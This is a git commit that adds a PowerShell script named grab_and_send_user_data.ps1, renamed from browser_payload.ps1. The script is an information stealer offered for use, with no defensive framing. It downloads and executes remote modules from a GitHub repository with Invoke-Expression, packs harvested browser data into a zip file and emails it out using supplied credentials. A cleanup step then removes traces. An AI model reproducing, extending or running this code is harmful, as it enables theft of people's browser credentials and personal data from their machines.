b9cf7edcd7b54ba79ef333157deac06558411e2d
jfkd02ks <115693098+jfkd02ks@users.noreply.github.com>
2022-10-16 10:59:10 +0300

    Update and rename browser_payload.ps1 to grab_and_send_user_data.ps1

---
+++ grab_and_send_user_data.ps1
@@ -0,0 +1,14 @@
+param (
+    [Parameter()]
+    [String]$Username,
+    [String]$Password
+)
+
+# Admin powershell
+# Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+# Remove-Variable * -ErrorAction SilentlyContinue; Remove-Module *; $error.Clear(); Clear-Host
+
+Invoke-Expression "& { $(Invoke-RestMethod https://github.com/jfkd02ks/playwithcode/raw/main/modules/work_folder_preparation.ps1) }"
+Invoke-Expression "& { $(Invoke-RestMethod "https://github.com/jfkd02ks/playwithcode/raw/main/modules/get_browsers_data.ps1") } browserdata.zip"
+Invoke-Expression "& { $(Invoke-RestMethod "https://github.com/jfkd02ks/playwithcode/raw/main/modules/sendto_email.ps1") } $Username $Password $env:appdata\Microsoft\dump\browserdata.zip"
+Invoke-Expression "& { $(Invoke-RestMethod "https://github.com/jfkd02ks/playwithcode/raw/main/modules/cleanup.ps1") }"
